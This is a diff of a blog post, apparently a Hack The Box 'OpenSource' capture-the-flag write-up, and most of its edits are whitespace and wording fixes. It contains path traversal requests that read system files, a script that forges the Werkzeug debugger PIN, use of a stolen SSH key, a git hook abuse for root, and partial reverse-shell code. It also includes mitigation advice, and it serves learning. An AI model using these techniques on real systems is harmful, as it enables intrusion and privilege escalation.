@@ -46,7 +46,7 @@ Open 10.129.126.28:80
 ...
 ```
 
-I found two:
+I found two ports:
 
 * 22 - SSH
 * 80 - HTTP
@@ -96,17 +96,17 @@ It found `/console` that took me to a Flask debug console. But I needed a PIN to
 
 ## File Uploads
 
-I tried the file upload function of the site. 
+I tried the file upload function of the site.
 
 ![File Upload](/assets/images/2022/10/OpenSource/FileUpload.png "File Upload")
 
-Once the file was uploaded, I could access it at `http://target.htb/uploads/FILE_NAME`. 
+Once the file was uploaded, I could access it at `http://target.htb/uploads/FILE_NAME`.
 
 ![Uploaded](/assets/images/2022/10/OpenSource/FileUploaded.png "Uploaded")
 
-I tried uploading a Python file. It worked, but the file was returned as a text file. It was not executed on the server. 
+I tried uploading a Python file. It worked, but the file was returned as a text file. It was not executed on the server.
 
-I downloaded the source code for the application and looked at it. The zip file contained a git repository. I looked into the history of the repo and found a dev branch that contained some credentials in an earlier commit. 
+I downloaded the source code for the application and looked at it. The zip file contained a git repository. I looked into the history of the repo and found a dev branch that contained some credentials in an earlier commit.
 
 ```
 {
@@ -249,11 +249,11 @@ nobody:x:65534:65534:nobody:/:/sbin/nologin
 It took me quite a while to understand why this worked. The `recursive_replace` function was removing the `../` from the passed path, so it was becoming `/etc/passwd`. Witch should not work if appended to `/app/public/uploads/`. After [some research](https://blog.sonarsource.com/10-unknown-security-pitfalls-for-python/), I found that `os.path.join` ignore any previous part if a part starts by a `/`. So if `path` is `/etc/passwd`, then the call `os.path.join(os.getcwd(), "public", "uploads", path)` will only return the value of `path`.
 
 
-## Getting the PIN 
+## Getting the PIN
 
-I should probably have used the path traversal bug to rewrite one of the Python file and get a reverse shell. But instead, I tried to get the PIN for the Werkzeug Debugger console. I found [a post on HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug) that explained how to generate it, but it didn't work. The version of Flask was different, so there were probably small differences in how the PIN was generated. 
+I should probably have used the path traversal bug to rewrite one of the Python file and get a reverse shell. But instead, I tried to get the PIN for the Werkzeug Debugger console. I found [a post on HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug) that explained how to generate it, but it didn't work. The version of Flask was different, so there were probably small differences in how the PIN was generated.
 
-To generate the PIN, I used the LFI to extract some information for the server. 
+To generate the PIN, I used the LFI to extract some information for the server.
 
 First, I needed the code that is used by Flask to generate the PIN.
 
@@ -271,9 +271,9 @@ If-Modified-Since: Wed, 01 Jun 2022 23:13:10 GMT
 If-None-Match: "1654125190.8242395-12-2550991558"
 ```
 
-I took this file and simplified it, keeping only code needed to generate the PIN. Then I extracted the other values I needed. 
+I took this file and simplified it, keeping only code needed to generate the PIN. Then I extracted the other values I needed.
 
-To get the MAC address, I had to find the interface that was used. 
+To get the MAC address, I had to find the interface that was used.
 
 ```http
 GET /uploads/..//..//..//..//proc/net/arp HTTP/1.1
@@ -286,7 +286,7 @@ IP address       HW type     Flags       HW address            Mask     Device
 172.17.0.1       0x1         0x2         02:42:7e:78:0f:46     *        eth0
 ```
 
-Then I could get the MAC for this interface. 
+Then I could get the MAC for this interface.
 
 ```http
 GET /uploads/..//sys/class/net/eth0/address HTTP/1.1
@@ -303,7 +303,7 @@ I converted it to decimal so I could use it as the value for `node` in the scrip
 2485377892361
 ```
 
-Next, I needed the value for the machine ID. This was the concatenation of values from two files. 
+Next, I needed the value for the machine ID. This was the concatenation of values from two files.
 
 
 ```http
@@ -326,7 +326,7 @@ Host: target.htb
 11:cpuset:/docker/c8ca454d258582d3e11e469d822a538f8a0aa4a96bcfd461cb3591ada9600164
 ```
 
-With this data, I had my script ready to generate the PIN. 
+With this data, I had my script ready to generate the PIN.
 
 ```python
 import hashlib
@@ -338,7 +338,7 @@ node = '2485377892361'
 def get_machine_id():
     linux = b""
     # GET /uploads/..//proc/sys/kernel/random/boot_id HTTP/1.1
-    linux = b"7de8344f-479d-402f-aeae-23e4f0c9ab1e" 
+    linux = b"7de8344f-479d-402f-aeae-23e4f0c9ab1e"
     # GET /uploads/..//proc/self/cgroup HTTP/1.1
     linux += b"c8ca454d258582d3e11e469d822a538f8a0aa4a96bcfd461cb3591ada9600164"
     return linux
@@ -360,7 +360,7 @@ def get_pin_and_cookie_name():
     # This information is here to make it harder for an attacker to
     # guess the cookie name.  They are unlikely to be contained anywhere
     # within the unauthenticated debug page.
-    
+
     private_bits = [node, get_machine_id()]
 
     h = hashlib.sha1()
@@ -398,14 +398,14 @@ def get_pin_and_cookie_name():
 print(get_pin_and_cookie_name()[0])
 ```
 
-I ran the script. 
+I ran the script.
 
 ```bash
-$ python generate_pin.py 
+$ python generate_pin.py
 100-685-731
 ```
 
-And I used the generated PIN to log in the console.
+And I used the generated PIN to log in the console. The console allows to run Python code. I used it to test running commands on the server.
 
 ![Console](/assets/images/2022/10/OpenSource/Console.png "Console")
 
@@ -430,9 +430,9 @@ root
 
 ## Getting Access to the Host Machine
 
-I was in as root, but I was in a container. I needed to find a way to the main machine. I looked around the container but did not find anything I could use. I got LinPEAS on it, still nothing. 
+I was in as root, but I was in a container. I needed to find a way to the main machine. I looked around the container but did not find anything I could use. I got LinPEAS on it, still nothing.
 
-Netcat was on the machine, so I wrote a small script to scan the host for opened ports. 
+Netcat was on the machine, so I wrote a small script to scan the host for opened ports.
 
 ```python
 import os
@@ -457,9 +457,9 @@ for i in range(65535):
 172.17.0.1 (172.17.0.1:6007) open
 ```
 
-Port 80 and 6000 to 6007 were web servers for the same app I already found. Just on different containers. 
+Port 80 and 6000 to 6007 were web servers for the same app I already found. Just on different containers.
 
-Port 3000 was more interesting. 
+Port 3000 was more interesting.
 
 ```
 tmp # nc 172.17.0.1 3000
@@ -493,11 +493,11 @@ Transfer-Encoding: chunked
 It was serving [Gitea](https://gitea.io/en-us/), a hosted interface for git.
 
 
-I found some exploits for it, but I failed to exploit them for the container. The exploits required `requests`to be installed. It was not and since the box did not have access to the internet, I could not install it. 
+I found some exploits for it, but I failed to exploit them from the container. The exploits required `requests`to be installed. It was not and since the box did not have access to the internet, I could not install it.
 
-I was stuck here for a while. I could not easily interact with the site in Python without `requests`. I could have done everything through netcat, but that sounded painful. What I needed was an SSH tunnel that would allow me reach the site on port 3000 of the host from my machine. But I could not get a tunnel since I was in a reverse shell, not an SSH connection. 
+I was stuck here for a while. I could not easily interact with the site in Python without `requests`. I could have done everything through netcat, but that sounded painful. What I needed was an SSH tunnel that would allow me reach the site on port 3000 of the host from my machine. But I could not get a tunnel since I was in a reverse shell, not an SSH connection.
 
-I went to the [Hack The Box forum](https://forum.hackthebox.com/t/official-opensource-discussion/257694) for a hint. This is where I learned about [Chisel](https://github.com/jpillora/chisel). Chisel allows creating SSH tunnel over HTTP. It also can create reverse port forwarding where the connection starts at the server and get out on the client. This is what I needed since a server in the container would have been unreachable. 
+I went to the [Hack The Box forum](https://forum.hackthebox.com/t/official-opensource-discussion/257694) for a hint. This is where I learned about [Chisel](https://github.com/jpillora/chisel). Chisel allows creating SSH tunnel over HTTP. It also can create reverse port forwarding where the connection starts at the server and get out to the client. This is what I needed since a server in the container would have been unreachable.
 
 I used this [post](https://medium.com/geekculture/chisel-network-tunneling-on-steroids-a28e6273c683) as an example of how to build the tunnel.
 
@@ -526,12 +526,12 @@ I opened `http://localhost:2222/` in my browser and it reached Gitea.
 
 ![Gitea](/assets/images/2022/10/OpenSource/Gitea.png "Gitea")
 
-I used the credentials I found in the source code to log in the site. There was one repository called `dev01/home-backup` and it contained a backup of dev01's SSH private key. I saved the copy on my machine and used it to connect to the server. 
+I used the credentials I found in the source code to log in the site. There was one repository called `dev01/home-backup` and it contained a backup of dev01's SSH private key. I saved the copy on my machine and used it to connect to the server.
 
 ```bash
 $ chmod 600 dev01_id_rsa
 
-$ ssh -i dev01_id_rsa dev01@target 
+$ ssh -i dev01_id_rsa dev01@target
 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -553,16 +553,16 @@ To see these additional updates run: apt list --upgradable
 
 Last login: Mon May 16 13:13:33 2022 from 10.10.14.23
 
-dev01@opensource:~$ ls 
+dev01@opensource:~$ ls
 user.txt
 
-dev01@opensource:~$ cat user.txt 
+dev01@opensource:~$ cat user.txt
 REDACTED
 ```
 
 ## Getting root
 
-Once connected, I looked around the server for ways to escalate my privileges. The user's home folder was a git repository. 
+Once connected, I looked around the server for ways to escalate my privileges. The user's home folder was a git repository.
 
 ```bash
 dev01@opensource:~$ ls -la
@@ -580,11 +580,11 @@ drwxrwxr-x 8 dev01 dev01 4096 Jun  5 11:39 .git
 Every time I made some changes in the home folder, a new commit would appear in the repository.
 
 ```
-dev01@opensource:~$ git status                     
-On branch main                                  
+dev01@opensource:~$ git status
+On branch main
 Your branch is ahead of 'origin/main' by 2 commits.
   (use "git push" to publish your local commits)
-                                                          
+
 nothing to commit, working tree clean
 
 dev01@opensource:~$ touch test
@@ -617,18 +617,18 @@ index 0000000..e69de29
 ...
 ```
 
-It appeared that some script was committing any changes to the home folder in the repository. To find the script, I used `watch` and `ps` to try and see the running processes. 
+It appeared that some script was committing any changes to the home folder in the repository. To find the script, I used `watch` and `ps` to try and see the running processes.
 
 ```
 dev01@opensource:~$ touch test2
 dev01@opensource:~$ watch -n 0.5 -d "ps aux | grep git"
 ```
 
-I waited until the minute changed and saw the script doing the backup run. 
+I waited until the minute changed and saw the script doing the backup run.
 
 ![ps](/assets/images/2022/10/OpenSource/ps.png "ps")
 
-The script `/usr/local/bin/git-sync` was being run by root. So if I could get it to run some custom code, I would be able to get root on the machine. 
+The script `/usr/local/bin/git-sync` was being run by root. So if I could get it to run some custom code, I would be able to get root on the machine.
 
 ```bash
 #!/bin/bash
@@ -646,7 +646,7 @@ else
 fi
 ```
 
-The script did not do much. It checked for uncommitted changes in the repository. If it finds any, it would add them to them and commit them before pushing the changes. I did not have permission to modify the script. And there was no writable folder on the path that I could have used to replace which git executable was executed. 
+The script did not do much. It checked for uncommitted changes in the repository. If it found any, it would add them to the index and commit them before pushing the changes. I did not have permission to modify the script. And there was no writable folder on the path that I could have used to replace which git executable was executed.
 
 In git, it's possible to use [hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) to run some code when an action happens. I used the pre-commit hook to open a reverse shell whenever the script tried to commit changes to the repository.
 
@@ -681,27 +681,27 @@ REDACTED
 
 ## Mitigation
 
-This was a very fun box to pwn. There was few opening that allowed me to gain access and escalate my privileges. 
+This was a very fun box to pwn. There was few opening that allowed me to gain access and escalate my privileges.
 
-The first big issue with the box was committing secrets to a repository. The source code contained the credentials of `dev01`. And the backup repository contained their private key. 
+The first big issue with the box was committing secrets to a repository. The source code contained the credentials of `dev01`. And the backup repository contained their private key.
 
 There should be safeguards against adding secrets:
 
 * Add common file to .gitignore
 * Use tools that scan for secrets in pre-commit hooks
-* Look for them in code review 
+* Look for them in code review
 
-Errors might still happen. If a password is committed, removing it like it was done in the application source code is not enough. The password needs to be changed because it is still part of the history. 
+Errors might still happen. If a password is committed, removing it like it was done in the application source code is not enough. The password needs to be changed because it is still part of the history.
 
-The problem with the LFI is a little harder. You need to really know your language to know about issues like the one in `os.path.join`. There are a few things that could be done to help with this issue. 
+The problem with the LFI is a little harder. You need to really know your language to know about issues like the one in `os.path.join`. There are a few things that could be done to help with this issue.
 
 * Rename the file instead of using the name provided by the user
-* Uploaded file information should be stored in a database. And only those files should be accessible. 
-* In this code, making sure the filename does not start with a / would have helped
+* Uploaded file information should be stored in a database. And only those files should be accessible.
+* In this code, making sure the filename does not start with a `/` would have helped
 
 Another problem with the box is that the debug console was available. This should never be activated in production applications. This console allows running any Python code. And access anything that the application has access to. It could be useful to debug issues while developing the application, but there is no reason to deploy it anywhere public.
 
-The last issue was the backup script. I'm not convinced that git is a good tool to run backups. But if they wanted to use it to keep snapshots, the script should have run as the user that is being backed up, not as root.
+The last issue was the backup script. I'm not convinced that git is a good tool to run backups. But if they wanted to use it to keep snapshots, the script should have run as the user that is being backed up, not as root. And make sure that only the user could write anywhere in the git repository.
 
 ## Bonus - Using The Path Traversal To Get The Sell
 
@@ -757,7 +757,7 @@ def send_report(path):
 ```
 
 
-I modified it to add a new `/shell` endpoint. 
+I modified it to add a new `/shell` endpoint.
 
 ```bash
 @app.route('/shell')
@@ -799,4 +799,4 @@ import socket,subprocess,os
 ...
 ```
 
-Lastly, I started a netcat listener and navigated to http://target.htb/shell. 
+Lastly, I started a netcat listener and navigated to http://target.htb/shell.
